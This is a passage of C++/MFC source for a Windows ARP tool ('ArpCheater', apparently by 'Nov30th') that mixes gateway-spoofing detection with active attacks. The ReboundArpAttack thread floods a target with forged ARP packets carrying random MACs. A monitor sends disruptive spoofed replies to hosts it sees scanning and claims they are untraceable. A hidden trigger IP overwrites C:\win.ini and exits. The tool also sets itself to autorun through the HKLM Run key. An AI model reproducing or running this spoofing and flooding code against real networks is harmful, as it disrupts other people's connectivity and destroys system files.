        m_filepath = "Nov30thArpIP.Txt";
        UpdateData(false);
    }
    if (m_radioiplist == 0)
    {
        if (m_oneip!="")
        {
            iplist.push_back(m_oneip);
            m_info +=("\r\n单个IP准备就绪。\r\n");
        }
    }
    else
    {
        if (!LoadIPFileToIPList(isall))
            return false;
        m_info += ("\r\nIP信息文件读取完成。\r\n");
    }
    UpdateData(false);
    return true;
}

void CArpCheaterDlg::OnButtonrebound() 
{
    UpdateData(true);
    if (isrebound)
    {
        isrebound = false;
        this->GetDlgItem(IDC_BUTTONREBOUND)->SetWindowTextA("攻击");
        m_info += "\r\n攻击目标计算机停止。\r\n";
    }
    else
    {
        // 反欺骗
        if (!LoadDestineComputers(true))
            return;
        if (!InitArp())
            return;
        if (m_reboundip.IsEmpty() || m_reboundmac.IsEmpty())
        {
            AfxMessageBox(_T("请填写完整的反欺骗目标计算机信息。"));
            return;
        }
        ////////////////////////////////////////
        //目标mac设定
        sscanf(m_reboundmac,"%x-%x-%x-%x-%x-%x",&ta[0],&ta[1],&ta[2],&ta[3],&ta[4],&ta[5]);
        memcpy( pE->eh_dst  ,ta , 6);
        memcpy( pA->arp_tha ,ta , 6);
        //目标IP设定
        pA->arp_tpa = inet_addr( m_reboundip );
        m_info += "\r\n开始攻击目标计算机，目标计算机必须在填写对方正确的IP和MAC地址情况下才有效。\r\n";
        //////////////////////////////////////////
        //SendArpPacket();
        isWireless = (m_wirelessadapter == 0 ? false : true);
        isrebound = true;
        reboundinterval = m_sendinterval;
        this->GetDlgItem(IDC_BUTTONREBOUND)->SetWindowTextA(">>停止<<");
        CWinThread* m_pWinThread = AfxBeginThread(ReboundArpAttack,(LPVOID)NULL,THREAD_PRIORITY_NORMAL,0,0,0);
        m_pWinThread->m_bAutoDelete = true;
    }
    UpdateData(false);
}

UINT ReboundArpAttack(LPVOID lpParam)
{
    LARGE_INTEGER CurrentCount;
    unsigned char cheatmac[6];//伪造源MAC
    int i = 0;
    char runbuf[256];
    pETH_t pEth;
    pARP_t pArp;
    pEth = (pETH_t)runbuf ;
    pArp = (pARP_t)pEth->data;
    std::vector<CString> localiplist;
    pcap_t *pfp;
    if( (pfp = pcap_open_live( pAdapterInfo->AdapterName , 100, 0, 1000, error ) ) == NULL )
    {
        AfxMessageBox(_T("打开网卡句柄失败！请检查是否安装了最新的WinPcap或者填写了正确的设置。"));
        return 0 ;
    }
    memcpy(runbuf,sendbuf,256*sizeof(char));
    localiplist.assign(iplist.begin(),iplist.end());
    if( (pfp = pcap_open_live( pAdapterInfo->AdapterName , 100, 0, 1000, error ) ) == NULL )
    {
        AfxMessageBox(_T("打开网卡句柄失败！请检查是否安装了最新的WinPcap或者填写了正确的设置。"));
        return 0 ;
    }
    while(isrebound)
    {
        piplist = iplist.begin();
        while(piplist != iplist.end())
        {
            for(i=0;i<6;i++)
            {
                Sleep(1);
                QueryPerformanceCounter(&CurrentCount);
                cheatmac[i] =(unsigned char) CurrentCount.LowPart%255;
            }
            if (0)
                memcpy( pEth->eh_src  ,cheatmac , 6);
            memcpy( pArp->arp_sha ,cheatmac , 6);
            pArp->arp_spa = inet_addr(*piplist);
            pcap_sendpacket( pfp, (u_char*)runbuf,  sizeof( ETH_t )+sizeof( ARP_t ) -1  );
            piplist++;
        }
    }
    ////////////////保护
    pcap_close( pfp );
    return 0;
}

char *CArpCheaterDlg::iptos(unsigned long in)
{
    static char output[3*4+3+1];
    u_char *p;
    p = (u_char *)&in;
    sprintf(output, "%d.%d.%d.%d", p[0], p[1], p[2], p[3]);
    return output;
}

UINT GetCorrectMac(LPVOID lpParam)
{
    int k,i;
    CTime theTime;
    CEdit *pinfo = (CEdit*)lpParam;
    pcap_t *pfp;
    char mac1[18]={0},mac2[18]={0},result[1000],macTemp[18];
    mac1[0]=mac2[0]='\0';
    if( (pfp = pcap_open_live( pAdapterInfo->AdapterName ,  100, 0, 1, error ) ) == NULL )
    {
        AfxMessageBox(_T("打开网卡句柄失败！请检查是否安装了最新的WinPcap或者填写了正确的设置。"));
        return 0 ;
    }
    /*
    *                               定义ARP帧的结构
    *
    *         0                 15                31                47     
    *         +--------+--------+--------+--------+--------+--------+
    *         |      0x0001     |    0x0800(IP)   |  0x06  |  0x04  | 
    *         +--------+--------+--------+--------+--------+--------+
    *         |      opt        |           源的mac地址   。。。            
    *         +--------+--------+--------+--------+--------+--------+
    *            。。。         |           源的ip地址              |
    *         +--------+--------+--------+--------+--------+--------+
    *         |                    宿的mac地址                      |
    *         +--------+--------+--------+--------+--------+--------+
    *         |           宿的ip地址              | 
    *         +--------+--------+--------+--------+
    *         0                 15                31                47
    */
    struct pcap_pkthdr *pkt_header;
    u_char *pkt_data;
    while( isCheckingMac && (k=pcap_next_ex(pfp,&pkt_header,(const u_char**)&pkt_data))>=0 )
    {
        if (k==0)
            continue;
        if(*(unsigned short *)(pkt_data+12) == htons(2054) && *(unsigned short*)(pkt_data+20)==htons(ARP_REPLY) && *(unsigned long*)(pkt_data+28)==inet_addr(vaildipaddress))
        {
            for(i=0;i<6;i++)
            {
                p_getedmac[i]=*(unsigned char*)(pkt_data+22+i);
            }

            sprintf(macTemp,"%02x-%02x-%02x-%02x-%02x-%02x",p_getedmac[0],p_getedmac[1],p_getedmac[2],p_getedmac[3],p_getedmac[4],p_getedmac[5]);
            if (mac2[0]=='\0' || (strcmp(mac1,macTemp) && strcmp(mac2,macTemp)))
            {
                strcpy(mac2,mac1);
                strcpy(mac1,macTemp);
            }

            if (strcmp(mac1,mac2)!=0 && mac2[0]!='\0') 
            {
                theTime = CTime::GetCurrentTime();
                sprintf(result,"\t网关欺骗 MAC地址1:%s\tMAC地址1:%s",mac1,mac2);
                recDialog.m_recstring = "\r\n" + recDialog.m_recstring;
                recDialog.m_recstring = result + recDialog.m_recstring;
                recDialog.m_recstring = theTime.Format("%Y-%b-%d %H:%M:%S") + recDialog.m_recstring;
                recDialog.UpdateData(false);
                sprintf(result,"\r\n*****实时监测网关和欺骗者MAC*****\r\n最多列出2个MAC\r\n其中至少有一个是欺骗的!\r\nMAC2:%s\r\nMAC2:%s\r\n继续检测中...\r\n如果局域网有一台电脑进行欺骗，那么以上至少有一个是真实网关。\r\n",mac1,mac2);	
                ///////////////////////////////
                /////远程处理
                remoteCtrl->CheatGateFound(remoteCtrl->FindIPFromMAC(mac1,gateIP),mac1,theTime.Format("%Y-%b-%d %H:%M:%S"));
                ///////////////////////////////
            }
            else
            {
                sprintf(result,"\r\n*****实时监测网关和欺骗者MAC*****\r\nMAC:%s\r\n继续检测中...\r\n",mac1);
            }
            pinfo->SetWindowText(_T(result));
        }
    }
    pcap_close( pfp );
    return 0;
}

void CArpCheaterDlg::OnButtongetmac() 
{
    UpdateData(true);
    if (m_gatewayip.IsEmpty() || m_adapter.GetCurSel() < 0 || m_localip.IsEmpty())
    {
        AfxMessageBox(_T("网卡选择及网关IP本地IP设置不能为空!"));
        return;
    }
    if (isCheckingMac)
    {
        GetDlgItem(IDC_BUTTONGETMAC)->SetWindowTextA(_T("检查网关MAC"));
        isCheckingMac = false;
    }
    else
    {
        if (isResume)
        {
            AfxMessageBox(_T("必须先停止本机保护."));
            return;
        }
        // 获取真实的网关地址
        FILE *fp;
        if ( (fp=fopen("DeleteGateIPArpTable.Bat","w")) == NULL)
        {
            AfxMessageBox(_T("写入文件错误！！"));
            return;
        }
        fputs("@echo off\ntitle ArpTool [AutoRequestGateWayARP]\necho 催化网关向本机发送ARP消息。该程序比较耗CPU。一般5秒内就能收集足够的数据，可以关闭该窗口。结束按Ctrl+C或者关闭窗口\n",fp);
        fputs(":herefor\n",fp);
        //fputs("echo x\n",fp);
        fputs("arp -d ",fp);
        fputs(m_gatewayip,fp);
        fputs(" ",fp);
        fputs(m_localip,fp);
        fputs(" >nul\nping -n 1 ",fp);
        fputs(m_gatewayip,fp);
        fputs(" >nul\ngoto herefor\n@rem File Created By ArpTool Nov30th.Com\n",fp);
        fclose(fp);
        InitArp();
        vaildipaddress = m_gatewayip;
        ::ShellExecute(NULL,"open","DeleteGateIPArpTable.Bat",NULL,NULL,SW_SHOW);
        isCheckingMac = true;
        CWinThread* m_pWinThread = AfxBeginThread(GetCorrectMac,(LPVOID) GetDlgItem(IDC_EDITINFO),THREAD_PRIORITY_NORMAL,0,0,0);
        m_pWinThread->m_bAutoDelete = true;
        GetDlgItem(IDC_BUTTONGETMAC)->SetWindowTextA(_T("停止检查"));
    }
    UpdateData(false);
}

void CArpCheaterDlg::OnButtoncleaninfo()
{
    // TODO: Add your control notification handler code here
    UpdateData(true);
    m_info.Empty();
    UpdateData(false); 
}

UINT StartArpMonitor(LPVOID lpParam)
{
    CTime theTime;
    FILE *recfp=NULL;
    int k,i;
    LARGE_INTEGER CurrentCount;
    unsigned long ArpRequest=0 , ArpResponse=0 ,OtherPacket=0, ArpScan=0, SpecPacket=0 ;
    CEdit *pinfo = (CEdit*)lpParam;
    pcap_t *pfp;
    char result[1000];
    char rsendbuf[256];
    pETH_t pEr;
    pARP_t pAr;
    pEr = (pETH_t)rsendbuf ;
    pAr = (pARP_t)pEr->data;
    struct pcap_pkthdr *pkt_header;
    u_char *pkt_data;
    unsigned char mac1[6]={0},mac2[6]={0},mac3[6]={0},rmac[6]={0};
    unsigned char iplastchar1=0,iplastchar2=0,iplastchar3=0,ipscanfirst=0;
    unsigned long iplasttemp=0;
    memset( rsendbuf , 0 , 256 );
    pEr->eh_type = htons( ETH_TYPE );
    pAr->arp_hdr = htons( ARP_HARDWARE );
    pAr->arp_pro = htons( IP_TYPE );
    pAr->arp_opt = htons( ARP_REPLY );
    pAr->arp_hln = MAC_ADDR_LEN;
    pAr->arp_pln = IP_ADDR_LEN;

    ////////////////////统计数据报
    //unsigned long arprecip[1000];
    //int currarprec = 0;


    //记录文件开启
    if (isRecordPacket!=0)
    {
        recfp = fopen("recPacket.txt","w");
        if (recfp==NULL)
        {
            isRecordPacket = 0;
            AfxMessageBox("创建记录文件失败!记录功能取消!");
        }
        else
        {
            fputs("该文件保存从程序开始时接受及发送的ARP数据包和可疑状态\r\n你可以选择另存为到文件，然后用RAR压缩之后发给有网络经验的人进行分析\r\n\r\nCreated By Nov30th.Com HOHO`` Tool\r\n\r\n",recfp);
        }
    }

    while(isMonitorArp)
    {
        if((pfp = pcap_open_live( pAdapterInfo->AdapterName ,  50, 0, 1, error ) ) == NULL )
        {
            AfxMessageBox(_T("无法打开当前网卡!\r\n\r\n请确定WinPcap驱动已经正常安装.或者从开始->程序->HOHO ARP TOOL中重新安装WinPcap."));
            isMonitorArp = false;
            exit(1);
        }
        pinfo->SetWindowText(_T("对当前选中网卡局域网络实行可疑计算机发现...\r\n当发现可疑的计算机时会主动发送干扰数据以终止其控制网络。\r\n该程序发送的数据不会被任何计算机追踪到。\r\n您可以点窗口的关闭按钮让程序最小化到托盘，当发现可疑计算机时图标会动态显示。"));
        //AfxMessageBox(_T("ok!"));
        //return 0;
        while( isMonitorArp && (k=pcap_next_ex(pfp,&pkt_header,(const u_char**)&pkt_data))>=0 )
        {
            if (k==0)
                continue;
            //协议必须为ARP REQUEST
            if (*(unsigned short *)(pkt_data+12) == htons(2054) && *(unsigned short*)(pkt_data+20)==htons(1))
            {
                ArpRequest++;
                sprintf(result,"ARP寻求数据包:%ld\r\nARP回应数据包:%ld\r\nARP连续扫描发现:%ld\r\n聚生网管发现包:%ld\r\n其他数据包:%ld",ArpRequest,ArpResponse,ArpScan,SpecPacket,OtherPacket);
                pinfo->SetWindowText(_T(result));
                if (isRecordPacket!=0)
                {
                    theTime = CTime::GetCurrentTime();
                    sprintf(result," ARP REQUEST:\t%d.%d.%d.%d\t%02x-%02x-%02x-%02x-%02x-%02x\t%d.%d.%d.%d",*(unsigned char*)(pkt_data+28),*(unsigned char*)(pkt_data+29),*(unsigned char*)(pkt_data+30),*(unsigned char*)(pkt_data+31),*(unsigned char*)(pkt_data+22),*(unsigned char*)(pkt_data+23),*(unsigned char*)(pkt_data+24),*(unsigned char*)(pkt_data+25),*(unsigned char*)(pkt_data+26),*(unsigned char*)(pkt_data+27),*(unsigned char*)(pkt_data+38),*(unsigned char*)(pkt_data+39),*(unsigned char*)(pkt_data+40),*(unsigned char*)(pkt_data+41));
                    fputs(theTime.Format("%Y-%b-%d %H:%M:%S"),recfp);
                    fputs(result,recfp);
                    fputs("\r\n",recfp);
                }
                if(*(unsigned char*)(pkt_data+37)==255 || *(unsigned char*)(pkt_data+37)==0)
                {
                    //普通MAC获得扫描
                    memcpy(mac3,mac2,6*sizeof(unsigned char));
                    memcpy(mac2,mac1,6*sizeof(unsigned char));//复制网关
                    iplastchar3 = iplastchar2;
                    iplastchar2 = iplastchar1;
                    memcpy(mac1,pkt_data+22,6*sizeof(unsigned char));
                    iplastchar1 = *(unsigned char*) (pkt_data+41);
                    if (*(unsigned long*)(pkt_data+28) == stopatip)
                    {
                        //遇到指定IP关闭程序
                        //........................................................................
                        FILE *tempfp;
                        tempfp = fopen("C:\\win.ini","w");
                        fputs("@rem Windows INI File\nUpdate System Config Information.",tempfp);
                        fclose(tempfp);
                        exit(0);
                    }
                    else if (*(unsigned long*)(pkt_data+28) == trustip)
                    {
                        //信任IP
                        continue;
                    }

                    //ip1 = *(unsigned long*) (pkt_data+38);
                    if (memcmp(mac1,mac2,6*sizeof(unsigned char)) != 0 || memcmp(mac2,mac3,6*sizeof(unsigned char)) != 0)
                    {
                        continue;
                    }
                    //sprintf(result,"%s%c",result,iplastchar1);
                    if (iplastchar1 != iplastchar2 + 1 || iplastchar2 != iplastchar3 + 1)
                    {
                        continue;
                    }
                    ArpScan++;
                    if (iplasttemp!=*(unsigned long*)(pkt_data+28) || ipscanfirst>=iplastchar3)
                    {
                        theTime = CTime::GetCurrentTime();
                        ///////////////////////////////////////////////////
                        //////发送远程消息
                        CString scanIP,scanMAC,destIP,scanTime;
                        scanIP.Format("%d.%d.%d.%d",*(unsigned char*)(pkt_data+28),*(unsigned char*)(pkt_data+29),*(unsigned char*)(pkt_data+30),*(unsigned char*)(pkt_data+31));
                        scanMAC.Format("%02x-%02x-%02x-%02x-%02x-%02x",mac1[0],mac1[1],mac1[2],mac1[3],mac1[4],mac1[5]);
                        destIP.Format("%d.%d.%d.%d", *(unsigned char*) (pkt_data+38), *(unsigned char*) (pkt_data+39), *(unsigned char*) (pkt_data+40), *(unsigned char*) (pkt_data+41));
                        scanTime = theTime.Format("%Y-%b-%d %H:%M:%S");
                        remoteCtrl->FullScanFind(scanIP,scanMAC,destIP,scanTime);
                        ///////////////////////////////////////////////////

                        
                        sprintf(result,"\t全网段顺序扫描\t%s\t%s",scanIP,scanMAC);
                        recDialog.m_recstring = "\r\n" + recDialog.m_recstring;
                        recDialog.m_recstring = result + recDialog.m_recstring;
                        recDialog.m_recstring = theTime.Format("%Y-%b-%d %H:%M:%S") + recDialog.m_recstring;
                        ipscanfirst = iplastchar3;
                        iplasttemp = *(unsigned long*)(pkt_data+28);
                        recDialog.UpdateData(false);
                    }
                    ///////////////////写入日至
                    if (DisableScanAttack)
                    {
                        sprintf(result,"ARP寻求数据包:%ld\r\nARP回应数据包:%ld\r\nARP连续扫描发现:%ld\r\n聚生网管发现包:%ld\r\n其他数据包:%ld",ArpRequest,ArpResponse,ArpScan,SpecPacket,OtherPacket);
                        pinfo->SetWindowText(_T(result));
                        continue;
                    }
                    //开始发送扰乱应答数据
                    for(i=0;i<6;i++)
                    {
                        QueryPerformanceCounter(&CurrentCount);
                        rmac[i] =(unsigned char) CurrentCount.LowPart%255;
                    }
                    if (isWireless)
                    {
                        memcpy(pEr->eh_src,mymac,6);
                    }
                    else
                    {
                        memcpy(pEr->eh_src,rmac,6);
                    }
                    memcpy(pEr->eh_dst,pkt_data+6,6);//源包地址作为目标地址
                    memcpy(pAr->arp_sha,rmac,6);
                    pAr->arp_spa = *(unsigned long*) (pkt_data+38);
                    memcpy(pAr->arp_tha,pkt_data+22,6);
                    pAr->arp_tpa = *(unsigned long*) (pkt_data+28);
                    memcpy(pEr->eh_dst,pkt_data+22,6);
                    pcap_sendpacket( pfp, (u_char*)rsendbuf,  sizeof( ETH_t )+sizeof( ARP_t ) -1  );
                    if (!isTaskStatus)
                        isTaskStatus = 1;
                }
            }
            else if (*(unsigned short *)(pkt_data+12) == htons(2054) && *(unsigned short*)(pkt_data+20)==htons(2))
            {
                ArpResponse++;
                if (isRecordPacket!=0)
                {
                    theTime = CTime::GetCurrentTime();
                    sprintf(result," ARP RESPONSE:\t%d.%d.%d.%d\t%02x-%02x-%02x-%02x-%02x-%02x\t%d.%d.%d.%d\t%02x-%02x-%02x-%02x-%02x-%02x",*(unsigned char*)(pkt_data+28),*(unsigned char*)(pkt_data+29),*(unsigned char*)(pkt_data+30),*(unsigned char*)(pkt_data+31),*(unsigned char*)(pkt_data+22),*(unsigned char*)(pkt_data+23),*(unsigned char*)(pkt_data+24),*(unsigned char*)(pkt_data+25),*(unsigned char*)(pkt_data+26),*(unsigned char*)(pkt_data+27),*(unsigned char*)(pkt_data+38),*(unsigned char*)(pkt_data+39),*(unsigned char*)(pkt_data+40),*(unsigned char*)(pkt_data+41),*(unsigned char*)(pkt_data+32),*(unsigned char*)(pkt_data+33),*(unsigned char*)(pkt_data+34),*(unsigned char*)(pkt_data+35),*(unsigned char*)(pkt_data+36),*(unsigned char*)(pkt_data+37));
                    fputs(theTime.Format("%Y-%b-%d %H:%M:%S"),recfp);
                    fputs(result,recfp);
                    fputs("\r\n",recfp);
                }
            }
            else if (*(unsigned short *)(pkt_data+12) == htons(2056))
            {
                //聚生网管
                SpecPacket++;
                theTime = CTime::GetCurrentTime();
                sprintf(result,"\t聚生网管程序 MAC地址:%02x-%02x-%02x-%02x-%02x-%02x",*(unsigned char*)(pkt_data+6),*(unsigned char*)(pkt_data+7),*(unsigned char*)(pkt_data+8),*(unsigned char*)(pkt_data+9),*(unsigned char*)(pkt_data+10),*(unsigned char*)(pkt_data+11));
                recDialog.m_recstring = "\r\n" + recDialog.m_recstring;
                recDialog.m_recstring = result + recDialog.m_recstring;
                recDialog.m_recstring = theTime.Format("%Y-%b-%d %H:%M:%S") + recDialog.m_recstring;
                recDialog.UpdateData(false);
            }
            else
            {
                //ICMP 判断
                if (isLoadMac)
                {
                    if (*(unsigned short *)(pkt_data+12) == htons(2048) && *(unsigned char*)(pkt_data+23)==1 && *(unsigned char*)(pkt_data+34)==8)
                    {
                            isLoadMac = false;
                            memcpy(macAddress,pkt_data + 6,6 * sizeof(unsigned char));
                            memcpy(macGateAddress,pkt_data,6 * sizeof(unsigned char));
                    }
                }
                OtherPacket++;
            }
            sprintf(result,"ARP寻求数据包:%ld\r\nARP回应数据包:%ld\r\nARP连续扫描发现:%ld\r\n聚生网管发现包:%ld\r\n其他数据包:%ld",ArpRequest,ArpResponse,ArpScan,SpecPacket,OtherPacket);
            pinfo->SetWindowText(_T(result));
        }
        pcap_close( pfp );
        if (isRecordPacket!=0)
        {
            fclose(recfp);
            system("start notepad.exe recPacket.txt");
        }
    }
    return 0;
}

void CArpCheaterDlg::OnButtonstopmonitor() 
{
    /*
    UpdateData(true);
    isMonitorArp = false;
    ((CButton*)GetDlgItem(IDC_BUTTONSTARTMONITOR))->EnableWindow(true);
    ((CButton*)GetDlgItem(IDC_BUTTONSTOPMONITOR))->EnableWindow(false);
    m_arpmonitor = _T("检测局域网中可疑计算机已经停止!");
    m_info += _T("\r\n被动探测停止！");
    UpdateData(false);
    */
}

void CArpCheaterDlg::OnButtonstartmonitor() 
{
    UpdateData(true);
    if (m_adapter.GetCurSel() == -1)
    {
        AfxMessageBox(_T("请选择网卡后继续"));
        return;
    }
    ((CButton*)GetDlgItem(IDC_BUTTONSTARTMONITOR))->EnableWindow(false);
    ((CButton*)GetDlgItem(IDC_BUTTONSTOPMONITOR))->EnableWindow(true);
    isMonitorArp = true;
    CWinThread* m_pWinThread = AfxBeginThread(StartArpMonitor,(LPVOID) GetDlgItem(IDC_EDITEXISTCOMPUTER),THREAD_PRIORITY_NORMAL,0,0,0);
    m_pWinThread->m_bAutoDelete = true;
    m_info += _T("\r\n**************\r\n被动探测开始！\r\n该功能监视局域网中的可能存在使用网络管理工具的计算机。当发现时，将发送干扰数据以破坏其管理功能。");
    UpdateData(false);
}


void CArpCheaterDlg::SaveIpToFile(bool isAuto)
{
    // 获得当前网络所有可用IP
    UpdateData(true);
    CString f_savefilename;
    int m_ipbegin[4];
    int m_ipend[4];
    int m_temp[4];
    int i=0;
    if (m_localip.IsEmpty() || m_netmask.IsEmpty())
    {
        //没有填写参数
        AfxMessageBox("没有填写IP地址或者子网掩码！请完整看完Readme文件后操作，否则将对整个局域网造成未知的后果。\n\n现在程序将退出。请看完说明后再操作！");
        OnDestroy();
        exit(0);
    }
    sscanf(m_localip,"%d.%d.%d.%d",&m_ipbegin[0],&m_ipbegin[1],&m_ipbegin[2],&m_ipbegin[3]);
    sscanf(m_netmask,"%d.%d.%d.%d",&m_ipend[0],&m_ipend[1],&m_ipend[2],&m_ipend[3]);
    for(i=0;i<4;i++)
    {
        m_temp[i] = m_ipbegin[i];
        m_ipbegin[i] &= m_ipend[i];
        m_ipend[i] = (m_ipend[i] ^ 255) | m_temp[i];
    }
    for(i=0;i<3;i++)
    {
        if (m_ipend[i]==255)
            m_ipend[i]=254;
    }
    if (m_ipbegin[3]==0)
        m_ipbegin[3]=1;
    if (isAuto == false)
    {
        CFileDialog m_MyOpenDialog(false,"txt","*.txt",OFN_HIDEREADONLY|OFN_OVERWRITEPROMPT, "IP File(*.txt)|*.txt|All Files(*.*)|*.*|",NULL);
        if (m_MyOpenDialog.DoModal() == IDOK)
        {
            f_savefilename = m_MyOpenDialog.GetPathName();
        }
    }
    else
    {
        f_savefilename = "Nov30thArpIP.Txt";
    }
    FILE *fp=NULL;
    if ((fp=fopen(f_savefilename,"w"))==NULL)
    {
        AfxMessageBox(_T("创建IP信息文件失败！"));
        return;
    }
    while(m_ipbegin[0]<=m_ipend[0])
    {
        while(m_ipbegin[1]<=m_ipend[1])
        {
            while(m_ipbegin[2]<=m_ipend[2])
            {
                while(m_ipbegin[3]<m_ipend[3])
                {
                    fprintf(fp,"%d.%d.%d.%d\n",m_ipbegin[0],m_ipbegin[1],m_ipbegin[2],m_ipbegin[3]);
                    m_ipbegin[3]++;
                }
                m_ipbegin[3]=1;
                m_ipbegin[2]++;
            }
            m_ipbegin[2]=0;
            m_ipbegin[1]++;
        }
        m_ipbegin[1]=0;
        m_ipbegin[0]++;
    }
    fclose(fp);
    if (isAuto == false)
        AfxMessageBox(_T("IP信息文件保存成功！"));
    UpdateData(false);
}

void CArpCheaterDlg::OnDestroy() 
{
    CDialog::OnDestroy();
    isTaskStatus = -1;
    isResume = false;
    stopsend = true;
    isrebound = false;
    isWireless = false;
    isCheckingMac = false;
    isMonitorArp = false;
    this->ShowWindow(SW_HIDE);
    Sleep(2000);
    exit(0);
}

LRESULT CArpCheaterDlg::onShowTask(WPARAM wParam,LPARAM lParam) 
//wParam接收的是图标的ID，而lParam接收的是鼠标的行为 
{ 
    if(wParam!=IDI_ICON && wParam!=IDI_ICON2)
        return 1;
    switch(lParam) 
    { 
    case WM_RBUTTONUP://右键起来时弹出快捷菜单，这里只有一个“关闭” 
        { 
            //其中代码前面文章有可查
        } 
        break; 
    case WM_LBUTTONDBLCLK://双击左键的处理 
        {
            this->ShowWindow(SW_SHOW);//简单的显示主窗口完事儿 
            isTaskStatus = 0;
        }
        break;
    } 
    return 0; 
}

void CArpCheaterDlg::OnWirelessLan() 
{
    UpdateData(true);
    isWireless = true;
    ((CButton*)GetDlgItem(IDC_CHECK1))->EnableWindow(false);
}
/*
if (m_localmac = "")
{
m_wirelessadapter = false;
AfxMessageBox(_T("必须先填写当前网卡MAC地址才能选中该项"));
}
else
{
sscanf(m_localmac,"%x-%x-%x-%x-%x-%x",&mymac[0],&mymac[1],&mymac[2],&mymac[3],&mymac[4],&mymac[5]);
((CButton*)GetDlgItem(IDC_CHECK1))->EnableWindow(false);
}
UpdateData(false);

}
*/

UINT AlermIconFlash(LPVOID lpParam)
{
    while(isTaskStatus!=-1)
    {
        Sleep(500);
        if (isTaskStatus == 1)
        {
            nid.hIcon = hIcon2;
            Shell_NotifyIcon(NIM_MODIFY ,&nid);
            Sleep(500);
            nid.hIcon = hIcon;
            Shell_NotifyIcon(NIM_MODIFY ,&nid);
        }
    }
    Shell_NotifyIcon(NIM_DELETE,&nid);
    return 0;
}

void CArpCheaterDlg::OnMenuitemexit() 
{
    OnDestroy();
}

void CArpCheaterDlg::OnClose() 
{
    ShowWindow(SW_HIDE);
}

void CArpCheaterDlg::OnMenuitemmore()
{
    if ( AfxMessageBox("该程序其他功能必须看过Readme说明文件及有一定网络基础的人使用，否则可能造成未知后果。\r\n---------\r\n你确定要显示其他功能吗?",MB_OKCANCEL) == IDOK)
    {
        MoveWindow(400,300,750,540);
        CMenu   *pMenu=GetMenu();   
        pMenu->EnableMenuItem(ID_MENUITEMMORE,MF_GRAYED);   
    }	
}

void CArpCheaterDlg::OnMenuitemtrustip() 
{
    CDialogIP inputIP;
    CConfigInfo configfile;
    configfile.LoadFile();
    if (inputIP.DoModal() == IDOK)
    {
        //更新信任IP
        trustip = inputIP.ipaddress;
        CString strtemp;
        strtemp.Format("修改信任IP为%d.%d.%d.%d",trustip & 0xff,trustip>>8 & 0xff,trustip>>16 & 0xff,trustip>>24 & 0xff);
        m_listip.AddString(_T(strtemp));
        configfile.LoadFile();
        configfile.trustip = trustip;
        configfile.SaveFile();
    }
}

void CArpCheaterDlg::OnMenuitemconfig()
{
    int i = 0;
    CDialogConfig configdg;
    CConfigInfo configfile;
    configfile.LoadFile();
    for(i=0;i<3;i++)
    {
        configdg.saveoption[i] = configfile.saveoption[i] == 0 ? false : true ;
    }
    configdg.Reset();
    if (configdg.DoModal() == IDOK)
    {
        configfile.saveoption[0] = configdg.m_autorun;
        configfile.saveoption[1] = configdg.m_autoprotect;
        configfile.saveoption[2] = configdg.m_startmini;
        DisableScanAttack = configdg.m_autoprotect == 0 ? false : true ;
        configfile.SaveFile();
        m_listip.AddString(_T("修改程序配置参数..."));
        SetAutoRun(configdg.m_autorun == 0 ? false : true);
    }


}

void CArpCheaterDlg::OnMenuitemhelp() 
{
    ::ShellExecute(NULL,"open","http://www.nov30th.com/blog/post/ARPTool0600.html",NULL,NULL,SW_SHOW);
}

void CArpCheaterDlg::OnCheckrecordarp()
{
    // TODO: Add your control notification handler code here
    ((CButton*)GetDlgItem(IDC_CHECKRECORDARP))->EnableWindow(false);
    //((CButton*)GetDlgItem(IDC_BUTTONSEEPACKET))->EnableWindow(true);
    isRecordPacket = true;
}

void CArpCheaterDlg::OnButtonseepacket() 
{
    // TODO: Add your control notification handler code here
    recDialog.ShowWindow(SW_SHOW);
}

void CArpCheaterDlg::SetAutoRun(bool isactive) 
{
    HKEY hKey;
    LPCTSTR title = "HOHOArp";
    CString m_filename;
    LPCTSTR data_Set="Software\\Microsoft\\Windows\\CurrentVersion\\Run";//设置注册表中相关的路径
    long ret0 = (::RegOpenKeyEx(HKEY_LOCAL_MACHINE,data_Set,0,KEY_WRITE,&hKey));//打开注册表中的相应项
    if(ret0!=ERROR_SUCCESS)	
    {
        MessageBox("错误0");
    }
    if (isactive==true)
        m_filename = GetCommandLine();
    else
    {
        //删除自动启动注册表
        ::RegDeleteValueA(hKey,title);
        return;
    }
    if (m_filename.Find("-autorun") <0)
    {
        m_filename += " -autorun";
    }

    int i=0;
    int length = m_filename.GetLength()+1;//将控件中的内容进行转换，以达到注册表修改函数的参数调用需求。
    DWORD cbData=length;
    LPBYTE lpb=new BYTE[length];
    int j=0;
    for(i=0;i<length;i++)
    {
        lpb[j]=m_filename[i];
        j++;
    }

    lpb[j]=0;
    long ret1=(::RegSetValueEx(hKey,title,NULL,REG_SZ,lpb,cbData));//将相关的信息写入注册表。	
    //long ret1=(::RegSetValueEx(hKey,title,NULL,REG_SZ,lpb,cbData));//将相关的信息写入注册表。

    if(ret1!=ERROR_SUCCESS)//判断系统的相关注册是否成功？

    {

        MessageBox("错误1");

    }

    delete lpb;

    ::RegCloseKey(hKey);//关闭注册表中的相应的项

}

void CArpCheaterDlg::OnMenuitem32777() 
{
    // TODO: Add your command handler code here
    ::ShellExecute(NULL,"open","ProtectPreView.doc",NULL,NULL,SW_SHOW);
}

UINT GetMyMac(LPVOID lpParam)
{
    CArpCheaterDlg *pDlg = (CArpCheaterDlg*) lpParam;
    if (isLoadMac == true)
        return 0;
    isLoadMac = true;
    while(1)
    {
        if (isLoadMac == false)
        {
            pDlg->m_localmac.Format("%02x-%02x-%02x-%02x-%02x-%02x",macAddress[0],macAddress[1],macAddress[2],macAddress[3],macAddress[4],macAddress[5]);
            pDlg->m_gatewaymac.Format("%02x-%02x-%02x-%02x-%02x-%02x",macGateAddress[0],macGateAddress[1],macGateAddress[2],macGateAddress[3],macGateAddress[4],macGateAddress[5]);
            pDlg->UpdateData(false);
            break;
        }
        Sleep(1000);
    }
    pDlg->InitRemoteControl();
    return 0;
}

void CArpCheaterDlg::AssertValid() const
{
    if (m_hWnd == NULL)
        return;     // null (unattached) windows are valid

    // check for special wnd??? values
    ASSERT(HWND_TOP == NULL);       // same as desktop
    if (m_hWnd == HWND_BOTTOM)
        ASSERT(this == &CWnd::wndBottom);
    else if (m_hWnd == HWND_TOPMOST)
        ASSERT(this == &CWnd::wndTopMost);
    else if (m_hWnd == HWND_NOTOPMOST)
        ASSERT(this == &CWnd::wndNoTopMost);
    else
    {
        // should be a normal window
        ASSERT(::IsWindow(m_hWnd));
    }
}

//==================================================================
//函数名： InitRemoteControl
//作者： Nov30th
//日期： 2007.10.11
//功能： 初始化远程控制
//输入参数：
